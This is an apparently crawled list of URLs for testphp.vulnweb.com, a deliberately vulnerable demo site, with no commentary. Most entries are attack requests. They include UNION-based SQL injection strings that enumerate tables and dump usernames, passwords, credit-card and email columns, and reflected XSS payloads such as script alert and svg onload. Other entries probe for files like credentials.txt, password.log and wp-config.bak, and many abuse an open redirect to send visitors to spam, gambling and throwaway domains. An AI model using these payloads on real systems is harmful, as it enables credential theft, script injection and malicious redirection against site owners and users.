      http://testphp.vulnweb.com/listproducts.php?artist=test
      http://testphp.vulnweb.com/listproducts.php?cat=
      http://testphp.vulnweb.com/listproducts.php?cat=$%7Binjection
      http://testphp.vulnweb.com/listproducts.php?cat='
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+all+select+1,group_concat(%27user:%27,uname,%27----pass:%27,pass,%27-----cc:%27,cc,%27------email:%27,email),3,4,5,6,7,8,9,10,11+from+users--+
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(table_name)+from+information_schema.tables+where+table_schema='acuart'+--
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(uname,0x3a,pass)+from+acuart.users+--
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,11
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,11+--
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,11--
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,@@version
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,database()+--
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,database()--
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,EVENT_CATALOG+from+information_schema.EVENTS
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(CHARACTER_SET_NAME)+from+information_schema
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(CHARACTER_SET_NAME,0x3a
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(column_name)+from+information_schema
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(table_name)+from+information_schema.tables
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,table_name+from+information_schema.tables
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,group_concat(colu
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,group_concat(table_name),3,4,5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,table_name,3,4,5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+
      http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,version%28%29,3,4,5,6,database%28%29,8,9,10,user%28%29
      http://testphp.vulnweb.com/listproducts.php?cat=-9999%20UNION%20SELECT%201,2,3,4,5,6,pass,8,9,10,11%20FROM%20users
      http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users
      http://testphp.vulnweb.com/listproducts.php?cat=.1
      http://testphp.vulnweb.com/listproducts.php?cat=.1'
      http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,2,3,4,5,6,7,8,9,10,11--
      http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,2,3,4,5,6,7,8,9,10,version(
      http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,group_concat(column_name
      http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,group_concat(table_name
      http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,group_concat(uname,0x3a,pass,0x3a,email
      http://testphp.vulnweb.com/listproducts.php?cat=0.or-1%23
      http://testphp.vulnweb.com/listproducts.php?cat=1
      http://testphp.vulnweb.com/listproducts.php?cat=1%0A%0A%0Avoici
      http://testphp.vulnweb.com/listproducts.php?cat=1%0A%0APour
      http://testphp.vulnweb.com/listproducts.php?cat=1%20and%201=1
      http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%201=1%20UNION%20ALL%20SELECT%201,2,3,4%20from%20information_schema.tables--%20-
      http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%201=1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables--%20-
      http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%201=1%20UNION%20ALL%20SELECT%201,table_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables--%20-
      http://testphp.vulnweb.com/listproducts.php?cat=1%20OR%20
      http://testphp.vulnweb.com/listproducts.php?cat=1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/listproducts.php?cat=1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/listproducts.php?cat=1%D8%B7%D8%A8%D8%A7%D8%B1%D9%84%D8%A7%D8%A8
      http://testphp.vulnweb.com:80/listproducts.php?cat=1%E2%80%9D
      http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%A2%D8%B9%D9%90%D9%82%D9%88%D9%85%D9%84%D8%A7%7Ctestphp.vulnweb.com%E2%80%A2%D8%B1%D9%8A%D8%BA%D8%AA%D9%8C%D9%85%D9%84%D8%A7
      http://testphp.vulnweb.com:80/listproducts.php?cat=1'
      http://testphp.vulnweb.com:80/listproducts.php?cat=1*
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+(SELECT+1+from+admin+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+(SELECT+1+from+user+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+(SELECT+1+from+users+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+pass+from+users+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+password+from+users+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+uname+from+users+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+username+from+users+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+ascii(substring((select
      http://testphp.vulnweb.com/listproducts.php?cat=1+and+SELECT+1+from+admins+limit+0,1
      http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1
      http://testphp.vulnweb.com:80/listproducts.php?cat=1+order+by+11+--
      http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12
      http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2
      http://testphp.vulnweb.com/listproducts.php?cat=1+PROCEDURE
      http://testphp.vulnweb.com/listproducts.php?cat=1+union+all+select+1,2,3,4,5,6,7,8,9,10,11
      http://testphp.vulnweb.com/listproducts.php?cat=1+union+all+select+1,2,3,4,5,6,7,8,9,10,11--
      http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27,@@version,%27vuln3%27,%27vuln4%27,%27vuln5%27,%27vuln6%27,%27vuln7%27,%27vuln8%27,%27vuln9%27,%27vuln10%27,%27vuln11%27
      http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27,database(),%27vul
      http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,2,3,4,5,6,7,8,9,10,11
      http://testphp.vulnweb.com/listproducts.php?cat=1+Union+Select+@k:=0x3c2f5469746c652f3c2f5363726970742f27223e3c5376672f4f6e4c6f61643d616c6572742831293e,@k,@k,@k,@k,@k,@k,@k,@k,@k,@k%23
      http://testphp.vulnweb.com/listproducts.php?cat=1-
      http://testphp.vulnweb.com/listproducts.php?cat=1--dbs
      http://testphp.vulnweb.com/listproducts.php?cat=123
      http://testphp.vulnweb.com/listproducts.php?cat=123%22
      http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert
      http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&zfdfasdf=124fffff
      http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fff...
      http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fffff
      http://testphp.vulnweb.com/listproducts.php?cat=123'
      http://testphp.vulnweb.com/listproducts.php?cat=140
      http://testphp.vulnweb.com/listproducts.php?cat=1^database
      http://testphp.vulnweb.com/listproducts.php?cat=1%60
      http://testphp.vulnweb.com/listproducts.php?cat=1a
      http://testphp.vulnweb.com/listproducts.php?cat=2
      http://testphp.vulnweb.com:80/listproducts.php?cat=2'
      http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+1--+
      http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+11--+
      http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+12--+
      http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+2--+
      http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+3--+
      http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+5--+
      http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+6--+
      http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert(%22Anmol%22)%3C/script%3E
      http://testphp.vulnweb.com/listproducts.php?cat=3
      http://testphp.vulnweb.com/listproducts.php?cat=4
      http://testphp.vulnweb.com/listproducts.php?cat=999999.9
      http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe%20src%3d%22%2f%2fmv9e
      http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe%25
      http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%253
      http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Ealert(0x105C3E
      http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Ealert(0x105C3E)%3C%2fscRipt%3E
      http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E
      http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Enetsparker(0x002752
      http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Enetsparker(0x002752)%3C%2fscRipt%3E
      http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Enetsparker(0x105C3E
      http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
      http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22
      http://testphp.vulnweb.com/listproducts.php?cat=z
      http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Ciframe%2Fsrc%3DJavaScriPt%3Aalert(45)%3E
      http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Cscript%3Ealert(45)%3C%2Fscript%3E
      http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z'%22%3E%3Csvg%2Fonload%3Dalert(45)%3Eto
      http://testphp.vulnweb.com/listproducts.php?id=1
      http://testphp.vulnweb.com/listproducts.php?id=1%27kOQjuk%3C%27%22%3EFcdVnA
      http://testphp.vulnweb.com/listproducts.php?id=1%29%22%2C%28%27%2C%28%2C%29.
      http://testphp.vulnweb.com/listproducts.php?id=5374
      http://testphp.vulnweb.com/lo
      http://testphp.vulnweb.com/logi
      http://testphp.vulnweb.com/logi...%20
      http://testphp.vulnweb.com:80/login
      http://testphp.vulnweb.com:80/login.
      http://testphp.vulnweb.com:80/login.asp
      http://testphp.vulnweb.com:80/login.html
      http://testphp.vulnweb.com:80/login.php
      http://testphp.vulnweb.com:80/login.php%22
      http://testphp.vulnweb.com/login.php%0A
      http://testphp.vulnweb.com/login.php%0A%0Alogin:
      http://testphp.vulnweb.com:80/login.php%20a
      http://testphp.vulnweb.com:80/login.php&fcbz=1
      http://testphp.vulnweb.com:80/login.php'
      http://testphp.vulnweb.com/login.php';
      http://testphp.vulnweb.com:80/login.php/admin
      http://testphp.vulnweb.com:80/login.php/administrator
      http://testphp.vulnweb.com:80/login.php/adminstrator
      http://testphp.vulnweb.com:80/login.php/AJAX/index.php
      http://testphp.vulnweb.com:80/login.php/artists.php
      http://testphp.vulnweb.com:80/login.php/cart.php
      http://testphp.vulnweb.com:80/login.php/categories.php
      http://testphp.vulnweb.com:80/login.php/comment.php?
      http://testphp.vulnweb.com:80/login.php/disclaimer.php
      http://testphp.vulnweb.com:80/login.php/guestbook.php
      http://testphp.vulnweb.com:80/login.php/index.php
      http://testphp.vulnweb.com:80/login.php/login.php
      http://testphp.vulnweb.com:80/login.php/privacy.php
      http://testphp.vulnweb.com:80/login.php/robots.txt
      http://testphp.vulnweb.com:80/login.php/signup.php
      http://testphp.vulnweb.com:80/login.php/userinfo.php
      http://testphp.vulnweb.com:80/login.php/users
      http://testphp.vulnweb.com:80/login.php/users/administrator
      http://testphp.vulnweb.com:80/login.php=1
      http://testphp.vulnweb.com:80/login.php=alert('Hacked%20by%20InfoXMax');
      http://testphp.vulnweb.com/login.php?id=1
      http://testphp.vulnweb.com/login.php[200
      http://testphp.vulnweb.com/login.php[200]
      http://testphp.vulnweb.com/login.phpCONFIRMED
      http://testphp.vulnweb.com/login.phpForm
      http://testphp.vulnweb.com/login.phpUser-Agent:
      http://testphp.vulnweb.com:80/login/AJAX/index.php
      http://testphp.vulnweb.com:80/login/artists.php
      http://testphp.vulnweb.com:80/login/cart.php
      http://testphp.vulnweb.com:80/login/categories.php
      http://testphp.vulnweb.com:80/login/disclaimer.php
      http://testphp.vulnweb.com:80/login/guestbook.php
      http://testphp.vulnweb.com:80/login/index.php
      http://testphp.vulnweb.com:80/login/login.php
      http://testphp.vulnweb.com:80/login/privacy.php
      http://testphp.vulnweb.com:80/login/signup.php
      http://testphp.vulnweb.com:80/login/userinfo.php
      http://testphp.vulnweb.com:80/logn
      http://testphp.vulnweb.com:80/logout.php
      http://testphp.vulnweb.com:80/logout.php'
      http://testphp.vulnweb.com/logout.php[200
      http://testphp.vulnweb.com/logout.php[200]
      http://testphp.vulnweb.com/logout.phpCookie
      http://testphp.vulnweb.com/logout.phpSet-Cookie:
      http://testphp.vulnweb.com:80/maddy.txt
      http://testphp.vulnweb.com/medias/
      http://testphp.vulnweb.com/medias/css/
      http://testphp.vulnweb.com/medias/css/main.css
      http://testphp.vulnweb.com/medias/img/
      http://testphp.vulnweb.com/medias/js/
      http://testphp.vulnweb.com/medias/js/common_functions.js
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/'[
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccessUser-Agent:
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-1%20AND%20((SELECT%20
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-3
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/details.php?
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=1
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/Details/color-printer/3/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/images
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/index.php
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/rate.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1%20-%20Copy.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.bak.html
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/RateProduct-1.html
      http://testphp.vulnweb.com:80/Mod_Rewrite_Shop/RateProduct-2.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
      http://testphp.vulnweb.com:80/newsartists.php
      http://testphp.vulnweb.com:80/newsastists.php
      http://testphp.vulnweb.com:80/newsdetail.php
      http://testphp.vulnweb.com:80/password.log
      http://testphp.vulnweb.com:80/php?
      http://testphp.vulnweb.com:80/phpinfo
      http://testphp.vulnweb.com:80/phpinfo.php
      http://testphp.vulnweb.com:80/phpmyadmin
      http://testphp.vulnweb.com:80/pictures
      http://testphp.vulnweb.com:80/pictures/1.jpg.tn
      http://testphp.vulnweb.com:80/pictures/2.jpg.tn
      http://testphp.vulnweb.com:80/pictures/3.jpg.tn
      http://testphp.vulnweb.com:80/pictures/4.jpg.tn
      http://testphp.vulnweb.com:80/pictures/5.jpg.tn
      http://testphp.vulnweb.com:80/pictures/6.jpg.tn
      http://testphp.vulnweb.com:80/pictures/7.jpg.tn
      http://testphp.vulnweb.com:80/pictures/8.jpg.tn
      http://testphp.vulnweb.com/pictures/credentials.txt
      http://testphp.vulnweb.com:80/pictures/ipaddresses.txt
      http://testphp.vulnweb.com:80/pictures/path-disclosure-unix.html
      http://testphp.vulnweb.com:80/pictures/path-disclosure-win.html
      http://testphp.vulnweb.com:80/pictures/wp-admin
      http://testphp.vulnweb.com:80/pictures/wp-config.bak
      http://testphp.vulnweb.com:80/pictures/WS_FTP.LOG
      http://testphp.vulnweb.com:80/picutes
      http://testphp.vulnweb.com:80/picutures
      http://testphp.vulnweb.com:80/POST%20/userinfo.php%20[uname=Joey%20pass=vega-0%20]
      http://testphp.vulnweb.com:80/privacy.php
      http://testphp.vulnweb.com:80/product.php?
      http://testphp.vulnweb.com:80/product.php?pic=1
      http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-
      http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com:80/product.php?pic=2
      http://testphp.vulnweb.com:80/product.php?pic=3
      http://testphp.vulnweb.com:80/product.php?pic=4
      http://testphp.vulnweb.com:80/product.php?pic=5
      http://testphp.vulnweb.com:80/product.php?pic=6
      http://testphp.vulnweb.com:80/product.php?pic=7
      http://testphp.vulnweb.com/product.php?pic=vuln1
      http://testphp.vulnweb.com:80/productlist.php?
      http://testphp.vulnweb.com:80/products
      http://testphp.vulnweb.com:80/questbook.php
      http://testphp.vulnweb.com:80/redir.php
      http://testphp.vulnweb.com/redir.php?r=
      http://testphp.vulnweb.com/redir.php?r=%0Ahttps://mungty26.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=%0Ahttps://uspharmus14.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=%0Ahttps://uspharmus18.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=%0Ahttps://wishnotes351.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=%0Ahttps://wishnotes36.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=%0Ahttps://wishnotes41.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=//0s6g879.cyou/143testphpvulnwebcomDbABRT351
      http://testphp.vulnweb.com/redir.php?r=//3es9cwaguz.xyz/180-testphpvulnwebcomDkR651
      http://testphp.vulnweb.com/redir.php?r=//4xrhzam.cyou/143testphpvulnwebcomScYnpq351
      http://testphp.vulnweb.com/redir.php?r=//amposkitzladgui.tk/143testphpvulnwebcomVNPwLT351
      http://testphp.vulnweb.com/redir.php?r=//bhajonspecunexpu.ga/113testphpvulnwebcomWqk651
      http://testphp.vulnweb.com/redir.php?r=//biowazea.tk/143testphpvulnwebcomARLCFb351
      http://testphp.vulnweb.com/redir.php?r=//bottridgliganabnya.tk/180testphpvulnwebcomYBX649
      http://testphp.vulnweb.com/redir.php?r=//bractamonfimiss.tk/180testphpvulnwebcomRya649
      http://testphp.vulnweb.com/redir.php?r=//catstantgorla.tk/113testphpvulnwebcomikm651
      http://testphp.vulnweb.com/redir.php?r=//ccpmxuoz.pics/180-testphpvulnwebcomkwr651
      http://testphp.vulnweb.com/redir.php?r=//cripapnoco.tk/143testphpvulnwebcomQJHAZf351
      http://testphp.vulnweb.com/redir.php?r=//daecronurerolme.gq/143testphpvulnwebcomVwmtLK351
      http://testphp.vulnweb.com/redir.php?r=//diskcistrogura.tk/180testphpvulnwebcomCSy649
      http://testphp.vulnweb.com/redir.php?r=//dispbuda.tk/143testphpvulnwebcomFljOAJ351
      http://testphp.vulnweb.com/redir.php?r=//doperdarapa.ml/143testphpvulnwebcomeAPGCo351
      http://testphp.vulnweb.com/redir.php?r=//doubtmantomerro.cf/180-testphpvulnwebcompDB651
      http://testphp.vulnweb.com/redir.php?r=//entamankindhigca.cf/d13testphpvulnwebcom86v655
      http://testphp.vulnweb.com/redir.php?r=//evtosysmadasen.ml/143testphpvulnwebcomSzi651
      http://testphp.vulnweb.com/redir.php?r=//forweisubsgisro.cf/180testphpvulnwebcomfFz649
      http://testphp.vulnweb.com/redir.php?r=//fracurrhod.tk/143testphpvulnwebcomcYSRne351
      http://testphp.vulnweb.com/redir.php?r=//hltn2te.cyou/143testphpvulnwebcomzuYMRH351
      http://testphp.vulnweb.com/redir.php?r=//imimsorti.ga/143testphpvulnwebcomCyihlm351
      http://testphp.vulnweb.com/redir.php?r=//jackdocttsit.ga/143testphpvulnwebcomyqGXcm351
      http://testphp.vulnweb.com/redir.php?r=//kandbinsoself.ml/143testphpvulnwebcomiLNdhP351
      http://testphp.vulnweb.com/redir.php?r=//kingviljumplu.ga/143testphpvulnwebcomDyAPKE351
      http://testphp.vulnweb.com/redir.php?r=//knobofsaterf.tk/143testphpvulnwebcomrZOmIt351
      http://testphp.vulnweb.com/redir.php?r=//lagerena.ml/143testphpvulnwebcomJsCaGf351
      http://testphp.vulnweb.com/redir.php?r=//lahamenxaly.cf/113testphpvulnwebcomsjq651
      http://testphp.vulnweb.com/redir.php?r=//miparale.gq/143testphpvulnwebcomfNIzvw351
      http://testphp.vulnweb.com/redir.php?r=//naisnowesbryn.ml/180testphpvulnwebcomYNn649
      http://testphp.vulnweb.com/redir.php?r=//ncorbeltnessprofec.tk/143testphpvulnwebcomYnhHSq351
      http://testphp.vulnweb.com/redir.php?r=//nmxt044.cyou/180-testphpvulnwebcomUSN651
      http://testphp.vulnweb.com/redir.php?r=//ntitaccusensetors.ml/113testphpvulnwebcomUxd651
      http://testphp.vulnweb.com/redir.php?r=//orimcidevi.tk/143testphpvulnwebcomAROMTS351
      http://testphp.vulnweb.com/redir.php?r=//pearliaterra.ml/143testphpvulnwebcomXqN651
      http://testphp.vulnweb.com/redir.php?r=//plumposmincparbea.tk/113testphpvulnwebcomhIy651
      http://testphp.vulnweb.com/redir.php?r=//podifdireri.tk/143testphpvulnwebcomQehLaB351
      http://testphp.vulnweb.com/redir.php?r=//pondtinglove.ml/113testphpvulnwebcomINd651
      http://testphp.vulnweb.com/redir.php?r=//ppdiv.com/143testphpvulnwebcomYiSTob351
      http://testphp.vulnweb.com/redir.php?r=//rilapsaco.tk/143testphpvulnwebcomGNHDRB351
      http://testphp.vulnweb.com/redir.php?r=//rtificarimorac.ga/113testphpvulnwebcomQsH651
      http://testphp.vulnweb.com/redir.php?r=//suzukiami.com/143testphpvulnwebcomJUoEvC351
      http://testphp.vulnweb.com/redir.php?r=//tageganocy.cf/180-testphpvulnwebcomXhL651
      http://testphp.vulnweb.com/redir.php?r=//teifetverppeditan.tk/143testphpvulnwebcomXnEKNx351
      http://testphp.vulnweb.com/redir.php?r=//tunhaylowatgu.tk/143testphpvulnwebcomYpkwRK351
      http://testphp.vulnweb.com/redir.php?r=//tutide.tk/143testphpvulnwebcomBcLqoA351
      http://testphp.vulnweb.com/redir.php?r=//volcesu.tk/143testphpvulnwebcomnBPFlG351
      http://testphp.vulnweb.com/redir.php?r=//zdqklv.cyou/143testphpvulnwebcommhqElI351
      http://testphp.vulnweb.com/redir.php?r=//zrq63s15p.cfd/143testphpvulnwebcomuHFcTf351
      http://testphp.vulnweb.com/redir.php%3Fr%3D//unrosevensozz.tk/113testphpvulnwebcomKXy651
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://laceight.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lacfive.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lacfour.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lacnine6.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lacseven.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lacsix.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lacten.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lacthree.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://lactwo5.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=%3Ca%20href=https://release64.blogspot.com/%3C/a
      http://testphp.vulnweb.com/redir.php?r=atghockeyettanfo1.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=atrytone-bigcountrytonescom8973.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=Biolinky.co/agenxionplay
      http://testphp.vulnweb.com/redir.php?r=carsmarketing12.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=carsvoyage.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=caxinwencom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=desighneremallcom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=desighnerru.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=dewjiblogcom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=donnemaincom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=emedycynaestetycznacompl.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=fassionaeu1.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=flavorfascination.com/
      http://testphp.vulnweb.com/redir.php?r=healthomecc1.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=healthwawpl32.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=herodungeonscom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://128.199.210.168/
      http://testphp.vulnweb.com/redir.php?r=http://134.209.36.68/
      http://testphp.vulnweb.com/redir.php?r=http://139.59.225.235/
      http://testphp.vulnweb.com/redir.php?r=http://139.59.236.11/
      http://testphp.vulnweb.com/redir.php?r=http://157.245.151.10/
      http://testphp.vulnweb.com/redir.php?r=http://157.245.202.229/
      http://testphp.vulnweb.com/redir.php?r=http://159.203.38.182/
      http://testphp.vulnweb.com/redir.php?r=http://165.22.32.44/
      http://testphp.vulnweb.com/redir.php?r=http://167.172.90.227/
      http://testphp.vulnweb.com/redir.php?r=http://167.99.225.95/
      http://testphp.vulnweb.com/redir.php?r=http://178.128.83.31/
      http://testphp.vulnweb.com/redir.php?r=http://188.166.90.238/
      http://testphp.vulnweb.com/redir.php?r=http://1domino1.vip/
      http://testphp.vulnweb.com:80/redir.php?r=http://1tip88.com/m88
      http://testphp.vulnweb.com/redir.php?r=http://206.189.150.114/
      http://testphp.vulnweb.com/redir.php?r=http://24newslive.press
      http://testphp.vulnweb.com/redir.php?r=http://2bkeyboardtop.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://2bkeyboardtop.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://3dconcreteprinting1.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://3dconcreteprinting1.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://abdulwahid675.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://aboutblogging.org/
      http://testphp.vulnweb.com/redir.php?r=http://adwqaz.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://agen-judi.site/
      http://testphp.vulnweb.com/redir.php?r=http://agenpokerhoki.info/
      http://testphp.vulnweb.com/redir.php?r=http://ageofanythingvc.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://allenferguson.tumblr.com
      http://testphp.vulnweb.com/redir.php?r=http://allkeyboardstop.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://allkeyboardstop.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://alwaqie.net/
